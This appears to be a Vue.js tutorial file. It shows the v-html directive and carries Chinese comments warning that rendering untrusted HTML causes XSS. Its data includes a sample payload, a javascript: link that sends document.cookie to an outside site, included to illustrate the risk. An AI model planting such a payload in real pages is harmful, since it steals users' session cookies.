<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8">
		<title></title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<div id="root">
			<h3>你好，{{name}}</h3>
			<div v-html="str">你好</div>
			<div v-html="str2">你好</div>
			<div v-html="str3">你好</div>
		</div>
		
		<script type="text/javascript">
			new Vue({
				el: '#root',
				data(){
					return {
						name: 'hello world',
						str: '<h3></h3>',
						str2: '<a href=javascript:location.href="https://www.baidu.com?"+document.cookie>跳转测试str2</a>',
						str3: '<a href="https://www.baidu.com?"+document.cookie>跳转测试str2</a>',
					}
				},
			});
			
			/*
			 *  v-html指令：
			 * 		1.作用：在指定节点中渲染包括html结构的内容
			 * 		2.与插值语法的区别：
			 * 			(1).v-html会替换掉节点中的内容，{{xx}}则不会
			 * 			(2).v-html可以识别html结构
			 * 		3.严重注意：v-html有安全性问题！！！
			 * 			(1).在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击
			 * 			(2).一定要在可信的内容上使用v-html，永远不要用在用户提交的内容上
			 */
		</script>
	</body>
</html>
